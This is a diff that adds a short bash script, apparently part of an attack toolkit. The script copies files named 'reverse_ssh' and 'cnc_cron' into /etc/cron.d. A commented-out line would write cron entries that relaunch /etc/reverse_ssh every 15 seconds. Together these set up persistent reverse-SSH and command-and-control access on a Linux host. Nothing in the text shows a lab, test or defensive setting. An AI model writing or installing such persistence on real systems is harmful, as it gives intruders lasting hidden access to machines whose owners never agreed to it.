@@ -1,0 +1,6 @@
+#!/bin/bash
+
+#printf "\n* * * * * /etc/reverse_ssh \n* * * * * ( sleep 15 ; /etc/reverse_ssh )\n* * * * * ( sleep 30 ; /etc/reverse_ssh )\n* * * * * ( sleep 45 ; /etc/reverse_ssh )\n" >> /etc/cron.d/
+
+cp ./reverse_ssh /etc/cron.d/
+cp ./cnc_cron /etc/cron.d/
